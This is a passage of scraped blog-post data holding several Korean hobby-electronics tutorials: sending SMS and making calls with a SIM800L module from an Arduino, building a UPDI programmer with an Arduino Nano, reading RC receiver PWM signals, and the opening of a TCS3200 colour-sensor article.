추가하는 것이 좋습니다. 과도한 공급 전력은 보드를 손상시킬 수 있습니다.\n\n<div class=\"content-ad\"></div>\n\n## Baud Rate\n\n1200 bps부터 115200 bps까지의 속도를 지원하며 자동 속도 감지 기능이 있습니다. 저희 프로젝트에서는 9600 bps를 사용할 예정입니다.\n\n## 디버깅 팁\n\n# 연결 코드 테스트\n\n<div class=\"content-ad\"></div>\n\n이제 Arduino 보드에 다음 코드를 업로드할 수 있습니다:\n\n```js\n#include <SoftwareSerial.h>\n\n// SIM800L과 통신하기 위한 소프트웨어 시리얼 객체 생성\nSoftwareSerial sim800l(11, 10); // SIM800L Tx & Rx를 Arduino #11 및 #10에 연결\nvoid setup()\n{\n  // Arduino 및 Arduino IDE (시리얼 모니터)와의 시리얼 통신 시작\n  Serial.begin(9600);\n  \n  // Arduino 및 SIM800L과의 시리얼 통신 시작\n  sim800l.begin(9600);\n\n  Serial.println(\"초기화 중...\");\n  delay(1000);\n\n  sim800l.println(\"AT\"); // 핸드셰이크 테스트가 성공하면 'OK'로 반환됩니다.\n  updateSerial();\n  sim800l.println(\"AT+CSQ\"); // 신호 품질 테스트, 값의 범위는 0에서 31까지이며, 31이 가장 좋습니다.\n  updateSerial();\n  sim800l.println(\"AT+CCID\"); // SIM 정보를 읽어 SIM이 꽂혀 있는지 확인합니다.\n  updateSerial();\n  sim800l.println(\"AT+CREG?\"); // 네트워크에 등록되었는지 확인합니다.\n  updateSerial();\n}\n\nvoid loop()\n{\n  updateSerial();\n}\n\nvoid updateSerial()\n{\n  delay(500);\n  while (Serial.available()) \n  {\n    sim800l.write(Serial.read()); // Serial이 전달한 내용을 소프트웨어 시리얼 포트로 전달합니다.\n  }\n  while(sim800l.available()) \n  {\n    Serial.write(sim800l.read()); // 소프트웨어 시리얼이 수신한 내용을 시리얼 포트로 전달합니다.\n  }\n}\n```\n\n시리얼 모니터를 열 때 'Both NL and CR' 옵션이 선택되었는지 확인하세요!\n\nArduino IDE의 시리얼 모니터는 다음 메시지를 반환해야 합니다:\n\n<div class=\"content-ad\"></div>\n\n\n![How to send a message and make a phone call from Arduino with SIM800L - Part 9](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_9.png)\n\n![How to send a message and make a phone call from Arduino with SIM800L - Part 10](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_10.png)\n\n\"AT+CSQ\" 명령어를 입력하면 21,0이 반환됩니다. 신호의 품질이 상당히 좋음을 의미합니다.\n\n\"AT+CCID\" 명령어를 입력하면 xxxxxxxxxxxxxxxxxx (20자리 숫자)가 반환됩니다. 이 명령어는 설치된 SIM 카드의 고유 통합 회로 카드 식별자(ICCID)를 반환합니다.\n\n\n<div class=\"content-ad\"></div>\n\n\"AT+CREG?\"은 0, 1을 반환합니다. SIM800L이 홈 네트워크에 등록되었음을 의미합니다.\n\n## 자주 발생하는 문제:\n\n연결 중에 실수를 하면 (예: 선을 잊었거나 잘못된 저항을 사용한 경우), \"테스트 연결 코드\"는 Serial Monitor에 \"Initializing...\"만 출력합니다. Arduino는 SIM800L과 통신할 수 없습니다. 이 경우 배선을 다시 한 번 확인해주세요!\n\n![이미지](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_11.png)\n\n<div class=\"content-ad\"></div>\n\n만약 당신의 SIM800L의 전원 공급이 2A를 제공할 수 없다면 LED 표시등은 1초에 한 번 깜박일 것입니다. 그러나 연결 테스트는 다음과 같은 메시지를 반환할 것입니다:\n\n“AT+CSQ”를 입력하면 0, 0이 반환됩니다. 이것은 신호 품질이 매우 나쁘다는 것을 의미합니다.\n\n“AT+CREG?”를 입력하면 0, 2가 반환됩니다. 이것은 SIM800L이 어떤 네트워크에도 등록되어 있지 않다는 것을 의미합니다.\n\n<img src=\"/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_12.png\" />\n\n<div class=\"content-ad\"></div>\n\n# 단계 2: SIM800L로 텍스트 메시지 보내기\n\nSMS를 보내려면 sim800l.println(\"AT+CMGF=1\")을 사용하여 메시지 형식을 선택할 수 있습니다. sim800l.println(\"AT+CMGS=\\\"+ZZxxxxxxxxxx\\\"\")를 사용하여 괄호 안에 제공된 전화 번호로 SMS를 전송하세요. ZZ는 전화 번호의 국가 코드입니다. sim800l.print(\"Hello from Robot Amateur!!!\")를 사용하여 해당 번호로 텍스트 메시지를 보내세요.\n\n```js\n#include <SoftwareSerial.h>\n\n// SIM800L과 통신하기 위한 소프트웨어 시리얼 객체 생성\nSoftwareSerial sim800l(11, 10); //SIM800L Tx & Rx가 Arduino #11 및 #10에 연결되어 있습니다.\n\nvoid setup()\n{\n  // Arduino 및 Arduino IDE (시리얼 모니터)와의 시리얼 통신 시작\n  Serial.begin(9600);\n  \n  // Arduino 및 SIM800L과의 시리얼 통신 시작\n  sim800l.begin(9600);\n\n  Serial.println(\"초기화 중...\"); \n  delay(1000);\n\n  sim800l.println(\"AT\"); // 핸드셰이크 테스트 성공 시 OK로 돌아갑니다.\n  updateSerial();\n\n  sim800l.println(\"AT+CMGF=1\"); // 텍스트 모드 설정\n  updateSerial();\n  sim800l.println(\"AT+CMGS=\\\"+ZZxxxxxxxxxx\\\"\");//ZZ를 국가 코드로, xxxxxxxxxx를 전화 번호로 변경하여 SMS를 보냅니다.\n  updateSerial();\n  sim800l.print(\"Hello from Robot Amateur!!!\"); //텍스트 내용\n  updateSerial();\n  sim800l.write(26);\n}\n\nvoid loop()\n{\n}\n\nvoid updateSerial()  \n{\n  delay(500);\n  while (Serial.available()) \n  {\n    sim800l.write(Serial.read()); // 시리얼이 수신한 내용을 소프트웨어 시리얼 포트로 전달합니다.\n  }\n  while(sim800l.available()) \n  {\n    Serial.write(sim800l.read()); // 소프트웨어 시리얼이 수신한 내용을 시리얼 포트로 전달합니다.\n  }\n}\n```\n\n모든 것이 잘 작동하면 시리얼 모니터에서 아래 메시지를 볼 수 있어야 합니다. 모듈 LED 표시등은 3초마다 한 번씩 깜박이고 있어야 합니다. 그리고 아래와 같이 핸드폰으로 \"Hello from Robot Amateur!!!\" 텍스트 메시지를 받아야 합니다!\n\n<div class=\"content-ad\"></div>\n\n\n![Image](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_13.png)\n\n## 자주 발생하는 문제:\n\n만약 SIM 카드에 PIN 코드가 설정되어 있다면, SIM800L을 사용하기 전에 먼저 PIN 코드를 SIM800L에 전송해야 합니다.\n\n예를 들어, 제 경우에는 \"AT+CMGF= \"+전화 번호\"\" 명령어로 \"ERROR\"라는 메시지를 받고 있었습니다. 이는 텍스트 메시지가 성공적으로 전송되지 않았음을 의미합니다.\n\n\n<div class=\"content-ad\"></div>\n\n\n![Image 1](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_14.png)\n\n![Image 2](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_15.png)\n\nOne potential reason may be: your sim card is locked with a pin.\n\nYou have 2 solutions:\n\n\n<div class=\"content-ad\"></div>\n\n- SIM 카드 핀 제거하기:\n\n휴대폰에 SIM 카드를 넣고, 설정-`SIM 카드 잠금-`SIM 카드 잠금 설정으로 이동하세요. 만일 SIM 카드에 핀 코드가 설정되어 있다면, 아래 화면과 유사해야 합니다:\n\n![이미지](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_16.png)\n\n“SIM 카드 잠금 해제” 슬라이드 버튼을 클릭하여 비활성화하세요. SIM 카드의 잠금을 해제하기 위해 핀 코드를 입력해야 합니다.\n\n<div class=\"content-ad\"></div>\n\n![img1](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_17.png)\n\n한번 실행하면 아래 화면을 보게 될 거에요. 이제 SIM 카드 PIN 코드가 비활성화되었습니다.\n\n![img2](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_18.png)\n\n2. `setup()` 함수에 SIM 카드 핀을 보내요\n\n<div class=\"content-ad\"></div>\n\n대신, SIM 카드 핀을 설정() 함수에 보내어 잠금을 해제할 수도 있습니다. 예를 들어, 핀이 1234인 SIM 카드를 잠금 해제하려면 설정() 루프에 다음 코드를 추가해야 합니다:\n\n```js\nString SIM_PIN_CODE = String(\"1234\");\nsim800l.print(\"AT+CPIN=\");\nsim800l.println(SIM_PIN_CODE);\n```\n\n업데이트된 코드는 아래와 같습니다:\n\n```js\n#include <SoftwareSerial.h>\n\n// SIM800L과 통신하기 위한 소프트웨어 시리얼 객체 생성\nSoftwareSerial sim800l(11, 10); // SIM800L의 Tx 및 Rx를 아두이노 #11 및 #10에 연결\n\nvoid setup()\n{\n  // 아두이노 및 아두이노 IDE(시리얼 모니터)와의 시리얼 통신 시작\n  Serial.begin(9600);\n  \n  // 아두이노와 SIM800L 간의 시리얼 통신 시작\n  sim800l.begin(9600);\n\n  Serial.println(\"초기화 중...\");\n  delay(1000);\n\n  sim800l.println(\"AT\"); // 핸드셰이크 테스트 성공시 OK로 돌아갑니다\n  updateSerial();\n\n  String SIM_PIN_CODE = String(\"1234\");\n  sim800l.print(\"AT+CPIN=\");\n  sim800l.println(SIM_PIN_CODE);\n  updateSerial();\n\n  sim800l.println(\"AT+CMGF=1\"); // 텍스트 모드 구성\n  updateSerial();\n  sim800l.println(\"AT+CMGS=\\\"+ZZxxxxxxxxxx\\\"\"); // ZZ를 국가 코드로 변경하고 xxxxxxxxxxx를 문자 메시지로 보낼 전화번호로 변경\n  updateSerial();\n  sim800l.print(\"로봇 아마추어에서 안녕하세요!!!\"); // 텍스트 내용\n  updateSerial();\n  sim800l.write(26);\n}\n\nvoid loop()\n{\n}\n\nvoid updateSerial()\n{\n  delay(500);\n  while (Serial.available())\n  {\n    sim800l.write(Serial.read()); // 시리얼이 받은 내용을 소프트웨어 시리얼 포트로 전달\n  }\n  while (sim800l.available())\n  {\n    Serial.write(sim800l.read()); // 소프트웨어 시리얼이 받은 내용을 시리얼 포트로 전달\n  }\n}\n```\n\n<div class=\"content-ad\"></div>\n\n만약 모든 것이 제대로 작동한다면, 시리얼 모니터는 아래와 같이 보일 것입니다:\n\n![이미지](assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_19.png)\n\n![이미지](assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_20.png)\n\n제 경우에는 SIM 카드의 PIN 코드가 1234이기 때문에 \"AT+CPIN=1234\"를 보냈습니다. 여러분은 여러분의 PIN 코드로 숫자를 조정할 수 있습니다. 이 명령은 OK를 반환하는데, 이는 PIN 코드가 성공적으로 전송되었음을 의미합니다.\n\n<div class=\"content-ad\"></div>\n\n\"AT+CMGF=1\"을 입력하고 OK가 반환되면, 텍스트 메시지를 보내는 모드가 성공적으로 설정되었음을 의미합니다.\n\n당신의 핸드폰에서는 \"문자 메시지 보내기 - 핸드폰 화면\"에서 보여지는 것과 동일한 메시지를 받아야 합니다.\n\n# 단계 3: SIM800L로 전화 걸기\n\n전화를 걸기 위해, 먼저 핸드셰이크를 위해 sim800l.println(\"AT\")을 사용합니다. 그 후에, 전화를 걸기 위해 sim800l.println(\"ATD+ +ZZxxxxxxxxxx;\")를 사용합니다. 괄호 안에 제공된 전화 번호로 전화를 걸고, 마지막으로 sim800l.println(\"ATH\")을 사용하여 전화를 끊어줍니다.\n\n<div class=\"content-ad\"></div>\n\n\n#include <SoftwareSerial.h>\n\n// SIM800L과 통신하기 위한 소프트웨어 시리얼 객체 생성\nSoftwareSerial sim800l(11, 10); // SIM800L의 Tx와 Rx를 아두이노의 11번 핀과 10번 핀에 연결\n\nvoid setup()\n{\n  // 아두이노 및 아두이노 IDE (시리얼 모니터)와의 시리얼 통신 시작\n  Serial.begin(9600);\n  \n  // 아두이노와 SIM800L 간의 시리얼 통신 시작\n  sim800l.begin(9600);\n\n  Serial.println(\"초기화 중...\"); \n  delay(1000);\n\n  sim800l.println(\"AT\"); // 핸드셰이크 테스트 성공시 OK로 돌아옵니다\n  updateSerial();\n\n  String SIM_PIN_CODE = String(\"1234\");\n  sim800l.print(\"AT+CPIN=\");\n  sim800l.println(SIM_PIN_CODE);\n  updateSerial();\n  \n  sim800l.println(\"ATD+ +ZZxxxxxxxxxx;\"); // ZZ에 국가 코드, xxxxxxxxxxx에 전화 걸 번호를 입력하세요\n  updateSerial();\n  delay(20000); // 20초 동안 대기합니다...\n  sim800l.println(\"ATH\"); // 전화 끊기\n  updateSerial();\n}\n\nvoid loop()\n{\n}\n\nvoid updateSerial()\n{\n  delay(500);\n  while (Serial.available()) \n  {\n    sim800l.write(Serial.read()); // 시리얼이 수신한 내용을 소프트웨어 시리얼 포트로 전달\n  }\n  while (sim800l.available()) \n  {\n    Serial.write(sim800l.read()); // 소프트웨어 시리얼이 수신한 내용을 시리얼 포트로 전달\n  }\n}\n\n\n이 코드를 업로드한 후 시리얼 모니터에 다음과 같은 메시지가 출력되었습니다. 모듈 LED 표시등은 3초마다 한 번 깜박여야 합니다. \"AT+CPIN=1234\" 명령이 \"ERROR\"를 반환했지만, \"ATD+ +ZZxxxxxxxxxx;\" 명령은 OK를 반환하여 전화가 성공적으로 걸렸음을 의미합니다.\n\n![아두이노 SIM800L을 사용하여 메시지 보내고 전화 걸기](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_21.png)\n\n![아두이노 SIM800L을 사용하여 메시지 보내고 전화 걸기](/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_22.png)\n\n\n<div class=\"content-ad\"></div>\n\n# 결론\n\n축하합니다! 이제 아두이노로 SMS를 보내고 전화를 걸 준비가 되었습니다! 이제 이를 집 안전 프로젝트에 적용할 수 있습니다. 예를 들어, 집 안전 프로젝트에 사용할 수 있습니다.\n\n질문이 있으시면 언제든지 댓글을 남겨주세요. DIY 프로젝트에 대한 흥미로운 아이디어가 있다면 댓글을 남겨주세요!","ogImage":{"url":"/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_0.png"},"coverImage":"/assets/img/2024-06-22-HowtosendamessageandmakeaphonecallfromArduinowithSIM800L_0.png","tag":["Tech"],"readingTime":13},{"title":"Arduino IDE와 AVRDUDESS를 사용해 기존 하드웨어로 UPDI 인터페이스를 통한 새로운 AVR 칩 프로그래밍하는 방법","description":"","date":"2024-06-22 18:47","slug":"2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS","content":"\n\n## 통합 프로그램 및 디버그 인터페이스 (UPDI) 이해하기\n\n통합 프로그램 및 디버그 인터페이스(UPDI)는 Microchip Technology가 개발한 프로프리어터리 인터페이스로서, AVR 및 SAM 마이크로컨트롤러의 프로그래밍 및 디버깅에 사용됩니다. 2016년 소개된 UPDI는 예전 AVR 마이크로컨트롤러에서 사용되던 In-System Programming (ISP) 및 Debug WIRE 인터페이스의 후속 제품입니다. UPDI는 마이크로컨트롤러와 상호작용하는 간단하고 효율적인 방법을 제공하며, 프로그래밍 및 디버깅 요구 사항에 맞는 기능을 포함하고 있습니다. 본 문서는 UPDI 프로토콜, 운영 메커니즘, 그리고 JTAG2UPDI와의 비교를 보다 자세히 살펴봅니다.\n\n## UPDI 개요\n\nUPDI는 UART (Universal Asynchronous Receiver-Transmitter) 시리얼 프로토콜을 기반으로 한 단방향, 이중 통신 프로토콜입니다. 기존의 UART 통신과 달리 별도의 Rx(수신) 및 Tx(송신) 라인을 사용하는 대신, UPDI는 데이터를 수신하고 송신하기 위한 단일 선을 활용합니다. 이 단순화는 핀 개수와 단순성이 중요한 임베디드 시스템에서 특히 유리합니다.\n\n<div class=\"content-ad\"></div>\n\nUPDI의 주요 기능:\n- 프로그래밍 및 디버깅: UPDI는 플래시, EEPROM, 퓨즈 및 잠금 비트를 포함한 비휘발성 메모리(NVM) 공간의 프로그래밍이 가능하며 온칩 디버깅을 용이하게 합니다.\n- PHY 인터페이스: UPDI의 물리적 레이어는 UART 기반으로, 통신을 위해 RESET 핀을 사용합니다. 반 이중 방식으로 작동하여 통신 방향이 데이터를 보내고 받는 것 사이에 교대로 변합니다.\n- 클럭: UPDI는 내부 발진기를 사용하여 일관된 타이밍과 동기화를 제공합니다.\n- 에러 검출: 프로토콜에는 패리티 체크 및 특수 프레임 형식을 통해 에러를 감지하고 신호화하는 메커니즘이 포함되어 있습니다.\n\n## UPDI 통신 프로토콜\n\n![이미지](/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_0.png)\n\n프로그래머 또는 디버거와 마이크로컨트롤러 간의 UPDI를 통한 통신에는 각각 특정 목적을 위해 사용되는 여러 가지 구별된 프레임 유형이 포함됩니다.\n\n<div class=\"content-ad\"></div>\n\n- 데이터 프레임: 시작 비트, 8개의 데이터 비트, 선택적 패리티 비트 및 두 개의 스톱 비트로 구성됩니다. 이 프레임은 실제 데이터를 전송하는 데 사용됩니다.\n- IDLE 프레임: 통신 라인의 유휴 상태를 나타내는 12개의 하이 비트로 구성됩니다.\n- BREAK 프레임: UPDI를 기본 상태로 재설정하는 데 사용되는 12개의 로우 비트로 구성됩니다. 일반적으로 오류 복구 목적입니다.\n- SYNCH 프레임: SYNCH 문자(0x55)는 프로그래머와 마이크로컨트롤러 간의 보드 속도를 동기화합니다.\n- ACK 프레임: UPDI에서 전송된 성공적인 명령 수신 및 실행을 확인하는 확인 프레임입니다.\n\n<img src=\"/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_1.png\" />\n\n프로그래머가 UPDI 인터페이스를 재설정하기 위해 BREAK 조건을 보내는 것으로 통신이 시작됩니다. 그 후에는 보드 속도를 동기화하기 위해 SYNCH 프레임이 이어집니다. 그 다음에 프로그래밍 또는 디버깅 명령이 교환되며, 양쪽이 번갈아가면서 송신자와 수신자 역할을 교체합니다.\n\n# 아두이노 나노를 사용하여 UPDI 프로그래머 만드는 방법\n\n<div class=\"content-ad\"></div>\n\nATtiny 마이크로컨트롤러를 UPDI 인터페이스를 사용하여 프로그래밍하려면, Arduino Nano를 UPDI 프로그래머로 사용할 수 있습니다. 이 안내서는 Arduino Nano 설정, Arduino IDE 구성, 그리고 펌웨어를 업로드하여 Nano를 UPDI 프로그래머로 변환하는 방법에 대한 단계별 지침을 제공합니다.\n\n필요한 구성품\n\n- Arduino Nano\n- 10μF 캐패시터\n- 4.7kΩ 저항기\n- 브레드보드\n- 점퍼 와이어\n\nUPDI 프로그래머 구성하기\n\n<div class=\"content-ad\"></div>\n\n- 하드웨어 설정:\n- 아두이노 나노의 핀 D6과 ATtiny 마이크로컨트롤러의 UPDI 핀 사이에 4.7kΩ 저항을 연결하세요.\n- 아두이노 나노의 GND 핀과 RST 핀 사이에 10μF 커패시터를 설치하세요. 커패시터의 양극(선이나 + 기호로 표시)이 RST 핀에 연결되어 있는지 확인하세요.\n\n연결을 도와줄 다이어그램이 있습니다:\n\n```js\nArduino Nano 핀 | 부품 | ATtiny 핀\n-----------------|------|------\nGND              | 점퍼 | GND\n5V               | 점퍼 | VCC\nD6               | 4.7kΩ | UPDI\nGND              | 10μF 캡 | GND\nRST              | 10μF 캡 | + (양극 부분)\n```\n\n<img src=\"/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_2.png\" />\n\n<div class=\"content-ad\"></div>\n\n2. 아두이노 IDE 준비하기:\n단계 1: 아두이노 IDE 설치\n— [아두이노 공식 웹사이트](https://www.arduino.cc/en/software)에서 아두이노 IDE를 다운로드하고 설치합니다.\n\n단계 2: megaTinyCore 패키지 추가\n— 아두이노 IDE를 열고 `File` Preferences`로 이동합니다.\n— \"Additional Board Manager URLs\" 필드에 다음 URL을 추가합니다: `http://drazzy.com/package_drazzy.com_index.json`.\n\n![이미지](/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_3.png)\n\n— 설정을 저장하려면 \"확인\"을 클릭합니다.\n— `Tools` Board` Boards Manager`로 이동합니다.\n— 검색란에 \"megaTinyCore\"를 입력하고 \"megaTinyCore by Spence Konde\"를 설치합니다.\n\n<div class=\"content-ad\"></div>\n\n<img src=\"/assets/img/2024-06-22-프로그래밍newAVR칩을기존하드웨어를이용해서UPDI인터페이스로바꾸기_4.png\" />\n\n3. 아두이노 나노를 UPDI 프로그래머로 변환하기:\n단계 1: UPDI 프로그래머 스케치 다운로드\n— [GitHub 저장소](https://github.com/ElTangas/jtag2updi)에서 jtag2updi 스케치를 다운로드합니다. 저장소를 ZIP 파일로 다운로드합니다.\n— ZIP 파일을 컴퓨터의 알려진 위치에 해제합니다.\n\n단계 2: 아두이노 IDE에서 스케치 열기\n— 아두이노 IDE를 열고 '파일` - '열기'를 선택합니다.\n— 압축 해제된 폴더로 이동하여 'jtag2updi.ino' 파일을 엽니다. `.ino` 파일이 비어 보일 수 있지만 괜찮습니다. 필요한 모든 코드는 동일한 폴더 내의 다른 파일에 있습니다.\n\n단계 3: 스케치를 아두이노 나노에 업로드\n— 아두이노 나노 보드를 선택합니다: `도구` - `보드` - `아두이노 나노`.\n— 올바른 프로세서를 선택합니다: `도구` - `프로세서` - `ATmega328P (이전 부트로더)` (해당하는 경우).\n— 올바른 포트를 선택합니다: `도구` - `포트` - `COM[X]` ([X]는 포트 번호입니다).\n— 아두이노 IDE에서 \"업로드\" 버튼을 클릭하여 스케치를 업로드합니다.\n\n<div class=\"content-ad\"></div>\n\n4. 아두이노 나노와 ATtiny 마이크로컨트롤러를 점퍼 와이어로 연결해 보세요:\n\n```js\n아두이노 나노 핀 | ATtiny 핀\n-----------------|-----------\nGND              | GND\n5V               | VCC\nD6               | UPDI\n```\n\n5. ATtiny에 코드 업로드하기:\n단계 1: 아두이노 IDE에서 ATtiny 보드 선택\n— `도구` `보드` `ATtiny`로 이동하고 적절한 ATtiny 모델(예: ATtiny1614)을 선택합니다.\n\n단계 2: 프로그래머 설정\n— `도구` `프로그래머`로 이동하고 `jtag2updi (megaTinyCore)`를 선택하세요.\n\n<div class=\"content-ad\"></div>\n\n단계 4: 코드 업로드하기\n- 코드를 확인하고 \"업로드\" 버튼을 클릭하여 업로드하세요.\n\nArduino IDE를 사용하여 코드를 업로드하는 방법은 매우 간단하고 쉬운 방법입니다.\n\n# AVRDUDESS를 사용하여 미리 컴파일된 펌웨어 업로드하기\n\n- Hex 파일 준비:\n만약 프로그램이 플랫폼 IO나 비슷한 플랫폼으로 작성되었다면, 코드의 컴파일된 Hex 파일을 얻을 수 있습니다.\n- AVRDUDESS 설치\n여기에서 설정을 다운로드할 수 있습니다.\n- `avrdude.conf` 수정:\n설치 디렉토리에서 `avrdude.conf` 파일을 찾으세요.\n그런 다음 VS code나 그와 유사한 플랫폼을 사용하여 구성 파일을 열고 다시 저장하고 구성 파일에 다음 부분을 추가하세요.\n\n<div class=\"content-ad\"></div>\n\n```js\n#------------------------------------------------------------\n# jtag2updi 프로그래머 정의\n#------------------------------------------------------------\n\nprogrammer\n  id    = \"jtag2updi\";\n  desc  = \"JTAGv2에서 UPDI로 변환\";\n  type  = \"jtagmkii_pdi\";\n  connection_type = serial;\n  baudrate = 115200;\n;\n```\n\n이 부분을 다음 줄 근처에 추가해주세요,\n\n<img src=\"/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_5.png\" />\n\n3. AVRDUDESS 사용 방법:\n— AVRDUDESS를 엽니다.\n— 프로그래머로 `JTAGv2에서 UPDI로 변환`을 선택합니다.\n— Arduino Nano가 연결된 COM 포트를 선택합니다.\n— 생성한 `.hex` 파일을 불러옵니다.\n— 코드를 ATtiny 마이크로컨트롤러에 업로드하려면 “프로그램”을 클릭합니다.\n\n<div class=\"content-ad\"></div>\n\n\n![Programming new AVR chip with UPDI interface](/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_6.png)\n\n- 작동하지 않으면 보레이트를 낮추거나 올바른 COM 포트가 선택되었는지 확인해보세요.\n\n## 유용한 링크\n\n- jtag2updi GitHub\n- Microchip Studio\n- AVRDUDESS\n\n\n<div class=\"content-ad\"></div>\n\n프로젝트에 잘 도움이 되길 바라요. 궁금한 게 있으면 언제든 물어봐 주세요.","ogImage":{"url":"/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_0.png"},"coverImage":"/assets/img/2024-06-22-ProgrammingnewAVRchipswithUPDIinterfacewithexistinghardwareUsingArduinoIDEandAVRDUDESS_0.png","tag":["Tech"],"readingTime":6},{"title":"Arduino를 사용하여 RC 수신기 신호 읽는 방법","description":"","date":"2024-06-22 18:46","slug":"2024-06-22-HowtoreadRCreceiversignalwithArduino","content":"\n\n![img](/assets/img/2024-06-22-HowtoreadRCreceiversignalwithArduino_0.png)\n\nRC 송신기와 수신기를 서보 모터 또는 비행 제어기와 함께 사용하는 방법에 대한 문서를 쉽게 찾을 수 있지만, Arduino를 사용하여 RC 신호를 읽는 예제를 찾기는 그렇게 쉽지 않습니다. 그래서 매우 직관적인 자습서를 작성하기로 결정했습니다.\n\n저는 FlySky FS-I6X 송신기와 FS-iA10B 수신기를 사용하고 있지만, PWM(Pulse With Modulation)을 지원하는 모든 수신기에서 작동해야 합니다. 이는 Arduino가 ~ 기호로 표시된 핀을 통해 아날로그 값을 출력하기 위해 사용하는 프로토콜과 동일합니다(그러나 우리는 Arduino를 사용하여 읽을 것이므로 이러한 핀만 사용할 필요는 없습니다).\n\n의도는 읽고자 하는 각 채널의 수신기 핀을 Arduino의 디지털 포트에 연결하는 것입니다. 매우 직관적입니다. Arduino 핀은 입력 포트로 작동하고 수신기도 Arduino의 5V에서 전원을 공급받아야 합니다. 이것은 수신기의 5개 채널, 짐벌을 위한 4개 채널, 그리고 온/오프 스위치를 위한 1개 채널을 읽기 위한 배선 스키마입니다:\n\n<div class=\"content-ad\"></div>\n\n\n![How to read RC receiver signal with Arduino](/assets/img/2024-06-22-HowtoreadRCreceiversignalwithArduino_1.png)\n\nArduino 스케치에서는 사용 중인 핀을 입력 핀으로 설정해야 하며 `pinMode(pin, INPUT)`과 같이 값을 읽을 때 `pulseIn(inputPort, HIGH, 2500)` 함수를 사용하여 값을 읽을 것입니다. 이는 실전에서 1000에서 2000 사이의 숫자를 의미하는 펄스의 지속 시간을 반환합니다. 짐벌에 대한 부정적인 값의 경우 1000에서 1499까지의 숫자를 읽을 것입니다. 0의 경우 1500을 읽습니다. 양수 값의 경우 1501에서 2000까지의 숫자를 읽습니다. 물론 송신기 구성에 따라 약간 달라질 수 있습니다. 이 범위로 작업하는 대신 다음과 같은 매우 편리한 함수를 사용할 수 있습니다. `map(channelValue, 1000, 2000, -100, 100)`. 이는 수신기에서의 모든 입력을 -100에서 100 사이의 비례적인 숫자로 변환할 것입니다. 수신기가 꺼져 있으면 아마도 값이 0이 되므로 이를 방지하기 위해 코드를 보호해야 합니다.\n\n다른 주의해야 할 점은 송신기의 반전 기능입니다. 사용 가능한 스위치 중 하나에 대해 이를 사용했습니다. FlySky 송신기는 수신기에 연결하기 전에 모든 스위치를 올리도록 강제하므로 `off` 값은 실제로 최고 값인 2000입니다. 따라서 이 채널을 반전시키면 `off` 값이 최소값인 1000이 되도록 할 수 있을 것입니다. 그러나 실수로 송신기를 끈 채 수신기를 켰을 때, 신호가 읽히지 않는 `on` 상황이 발생할 수 있습니다. 송신기를 끈 채로 수신기를 켜면 절대 안 되는 것은 알지만 개발 중에는 사고가 발생하기도 합니다. 따라서 반전 신호 기능을 사용하기보다는 사전에 예방하는 것이 좋습니다.\n","ogImage":{"url":"/assets/img/2024-06-22-HowtoreadRCreceiversignalwithArduino_0.png"},"coverImage":"/assets/img/2024-06-22-HowtoreadRCreceiversignalwithArduino_0.png","tag":["Tech"],"readingTime":2},{"title":"TCS3200 센서를 이용한 NPK질소, 인산, 칼륨 검출 방법","description":"","date":"2024-06-22 18:45","slug":"2024-06-22-NPKDetectionusingTCS3200sensor","content":"\n\nNPK는 질소, 인 및 칼륨으로 토양에서 가장 기본적인 영양소입니다. 이 무기 성분들은 식물 성장에 도움이 되는 토양의 비옥도를 유지하는 데 중요합니다. 전통적인 NPK 센서는 토양 속 질소, 인 및 칼륨 함량을 결정하는 데 적합하며, 토양 내 질소, 인 및 칼륨 농도에 의해 유도된 전도도 변화를 검출하여 토양의 비옥도를 평가합니다. 그러나 이 센서의 단점은 토양에 삽입되어 값을 테스트해야 하며, 이 값은 특정 영역에만 적용되며 이 센서로 얻은 값은 토양 내 NPK 함량의 정확한 양을 측정할 수는 없지만 작농가들이 비료를 적용하는 데 도움이 되는 경험적 및 이론적 값이 제공됩니다. 따라서 현장 테스트는 수행할 수 없습니다. 이때 TCS3200 센서가 도움이 될 수 있습니다. NPK 센서보다 효율적이며 현장 토양 테스트를 쉽게 수행할 수 있습니다.\n\n# TCS3200 센서:\n\n![TCS3200](/assets/img/2024-06-22-NPKDetectionusingTCS3200sensor_0.png)\n\n위 이미지는 TCS3200 색상 센서입니다. 이 센서는 기본적으로 RGB 색상 센서이며 이미지에서 볼 수 있듯이 회로 기판의 각 모서리에 4개의 흰색 조명 LED와 4개의 단자가 있지만, 실제 센서는 중앙에 위치해 있습니다.\n\n<div class=\"content-ad\"></div>\n\n\n![TCS3200 